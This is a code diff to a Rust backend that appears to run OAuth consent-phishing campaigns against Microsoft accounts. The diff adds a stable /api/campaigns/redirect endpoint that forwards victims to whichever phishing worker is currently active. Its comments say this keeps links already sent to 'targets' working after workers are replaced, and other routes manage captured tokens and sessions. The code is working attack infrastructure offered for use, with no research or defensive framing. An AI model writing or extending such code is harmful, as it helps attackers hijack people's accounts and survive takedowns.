@@ -1231,14 +1231,18 @@ async fn generate_oauth_link(
         state_param
     );
 
-    // Short redirect link: the Worker's /start endpoint redirects to the
-    // full Microsoft authorize URL. This is what should be sent to targets
-    // — it's short, clean, and doesn't expose the full OAuth params.
+    // Short redirect link: uses the backend's stable /api/campaigns/redirect
+    // endpoint which always redirects to the current active worker's /start.
+    // This URL never changes even when workers are auto-replaced, so old
+    // links sent to targets continue to work indefinitely.
     let short_link = if is_local {
         link.clone()
     } else {
-        // Extract worker base URL from redirect_uri
-        redirect_uri.strip_suffix("/oauth/callback").unwrap_or(&redirect_uri).to_string() + "/start"
+        // Use the backend's own /api/campaigns/redirect endpoint as the
+        // stable short link. Proxied through Vercel, this becomes:
+        //   https://<frontend>.vercel.app/api/campaigns/redirect
+        // which is stable regardless of which worker is active.
+        "/api/campaigns/redirect".to_string()
     };
 
     HttpResponse::Ok().json(GenerateOAuthLinkResponse {
@@ -1246,6 +1250,19 @@ async fn generate_oauth_link(
         worker_url: redirect_uri.clone(),
         short_link,
     })
+}
+
+/// Stable redirect endpoint — always redirects to the current active
+/// worker's /start page. This URL never changes even when workers are
+/// auto-replaced, so old links sent to targets continue to work.
+async fn oauth_redirect_handler(
+    state: web::Data<AppState>,
+) -> impl Responder {
+    let (worker_name, workers_subdomain) = get_active_worker(&state).await;
+    let worker_start_url = format!("https://{}.{}/start", worker_name, workers_subdomain);
+    HttpResponse::Found()
+        .append_header(("Location", worker_start_url.as_str()))
+        .finish()
 }
 
 // Embedded worker script for deployment.
@@ -3109,6 +3126,7 @@ async fn main() -> std::io::Result<()> {
             .route("/api/tokens/{id}/session/status", web::get().to(get_session_status_handler))
             .route("/api/tokens/{id}/session/kill", web::post().to(kill_session_handler))
             .route("/api/campaigns/generate-link", web::get().to(generate_oauth_link))
+            .route("/api/campaigns/redirect", web::get().to(oauth_redirect_handler))
             .route("/api/campaigns/deploy-worker", web::post().to(deploy_worker))
             .route("/api/admins/one-click-deploy", web::post().to(one_click_deploy_handler))
             .route("/api/admins/finalize-worker", web::post().to(finalize_worker_handler))
